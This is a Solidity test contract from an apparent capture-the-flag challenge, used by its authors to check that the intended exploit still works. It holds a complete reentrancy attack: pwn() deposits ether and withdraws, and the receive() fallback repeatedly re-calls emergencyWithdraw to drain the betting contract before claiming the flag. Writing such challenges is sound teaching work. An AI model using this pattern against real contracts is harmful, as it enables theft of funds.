// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Author-only smoke test contract. Not shipped to players — lives here so
// entrypoint author tests can deploy it alongside the challenge to verify
// the exploit chain still lands after any contract edits.

interface IStadiumBetting {
    function deposit() external payable;
    function emergencyWithdraw() external;
}

interface ITrophyVault {
    function claim() external;
    function flag() external view returns (string memory);
}

contract Attacker {
    IStadiumBetting public immutable betting;
    ITrophyVault public immutable vault;
    uint256 public constant STAKE = 10 ether;

    constructor(address _betting, address _vault) {
        betting = IStadiumBetting(_betting);
        vault = ITrophyVault(_vault);
    }

    function pwn() external payable {
        require(msg.value >= STAKE, "send 10 ether");
        betting.deposit{value: STAKE}();
        betting.emergencyWithdraw();
        vault.claim();
    }

    receive() external payable {
        if (address(betting).balance >= STAKE) {
            betting.emergencyWithdraw();
        }
    }
}
